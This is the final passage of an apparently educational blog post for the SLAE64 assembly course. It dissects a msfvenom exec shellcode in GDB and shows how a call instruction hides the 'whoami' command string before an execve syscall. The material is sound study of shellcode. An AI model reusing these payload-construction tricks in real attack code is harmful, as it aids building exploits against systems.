<p>The <code>call</code> is used to store the next instruction address onto the stack and redirect execution further in the &ldquo;middle&rdquo; of <code>0x0000555555558080 &lt;+32&gt;:    imul   eax,DWORD PTR [rax],0x5e545756</code> instruction</p>
<pre tabindex="0"><code>gef➤  x/7i 0x555555558082
    0x555555558082 &lt;code+34&gt;:    push   rsi
    0x555555558083 &lt;code+35&gt;:    push   rdi
    0x555555558084 &lt;code+36&gt;:    push   rsp
    0x555555558085 &lt;code+37&gt;:    pop    rsi
    0x555555558086 &lt;code+38&gt;:    push   0x3b
    0x555555558088 &lt;code+40&gt;:    pop    rax
    0x555555558089 &lt;code+41&gt;:    syscall 
</code></pre><p>Based on the <code>call</code> address, I examined the isntruction after that address and the above obfuscated appeared &ldquo;magically&rdquo;.</p>
<h5 id="the-execves-command">The execve&rsquo;s Command<a hidden class="anchor" aria-hidden="true" href="#the-execves-command">#</a></h5>
<pre tabindex="0"><code>0x0000555555558076 &lt;+22&gt;:    call   0x555555558082 &lt;code+34&gt;
0x000055555555807b &lt;+27&gt;:    ja     0x5555555580e5
0x000055555555807d &lt;+29&gt;:    outs   dx,DWORD PTR ds:[rsi]
0x000055555555807e &lt;+30&gt;:    (bad)  
0x000055555555807f &lt;+31&gt;:    ins    DWORD PTR es:[rdi],dx
0x0000555555558080 &lt;+32&gt;:    imul   eax,DWORD PTR [rax],0x5e545756
</code></pre><p>The <code>call</code> isntruction does the magic here. It pushes onto the top of the stack the next address. In pratical terms, the bytes of the next isntruction are pushed onto the stack and the CPU will read those bytes until finds a null.</p>
<p>if we examine the address of <code>ja     0x5555555580e5</code>, we verify the command <code>whoami</code> is right there.</p>
<pre tabindex="0"><code>gef➤  x/s 0x000055555555807b
0x55555555807b &lt;code+27&gt;:       &#34;whoami&#34;
</code></pre><h5 id="everything-set-call-execve">Everything set, call execve!<a hidden class="anchor" aria-hidden="true" href="#everything-set-call-execve">#</a></h5>
<p>Let&rsquo;s check how the stack and the registers are set before the interruption syscall.</p>
<p><img loading="lazy" src="/slae64/5/exec_gdb.jpg#center" alt="Exec syscall"  title="Exec syscall"  />
</p>
<hr>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
<p><code>Student ID: PA-31319</code></p>
<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86_64">https://github.com/0xnibbles/slae_x86_64</a></p>
<hr>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://0xnibbles.github.io/tags/slae64/">slae64</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_6/">
    <span class="title">« Prev</span>
    <br>
    <span>Slae64 Assignment 6 - Polymorphic Shellcode</span>
  </a>
  <a class="next" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_4/">
    <span class="title">Next »</span>
    <br>
    <span>SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 5 - Msfvenom Shellcode Analysis  on twitter"
        href="https://twitter.com/intent/tweet/?text=SLAE64%20Assignment%205%20-%20Msfvenom%20Shellcode%20Analysis%20&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_5%2f&amp;hashtags=slae64">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 5 - Msfvenom Shellcode Analysis  on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_5%2f&amp;title=SLAE64%20Assignment%205%20-%20Msfvenom%20Shellcode%20Analysis%20&amp;summary=SLAE64%20Assignment%205%20-%20Msfvenom%20Shellcode%20Analysis%20&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_5%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
</div>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
